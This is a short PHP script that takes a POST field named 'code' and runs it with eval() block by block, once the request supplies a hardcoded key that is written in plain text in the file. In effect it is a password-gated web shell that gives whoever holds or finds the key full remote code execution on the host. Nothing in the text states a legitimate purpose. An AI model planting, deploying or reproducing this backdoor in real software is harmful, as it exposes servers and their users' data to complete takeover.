<?php
if(isset($_POST['code']) && $_POST['api_key']=='TDUgYS2k309nRW77p8nBTPEpB3WkXp') {
    evalNextBlock($_POST['code']);
}

function stripTags($code, $offset=0) {
    $startTag = '<?php';
    $endTag = '?>';

    $start = strpos($code,$startTag)+strlen($startTag);
    $end = strpos($code,$endTag);

    return substr($code, $start, $end-$start);
}

function evalNextBlock($code) {
    $nextBlockStart = strpos($code, '<?php');
    if($nextBlockStart !== false) {
        $nextBlockEnd = strpos($code, '?>');
        print substr($code, 0, $nextBlockStart);
        eval(stripTags($code));
        evalNextBlock(substr($code, $nextBlockEnd+2));
    }
}
?>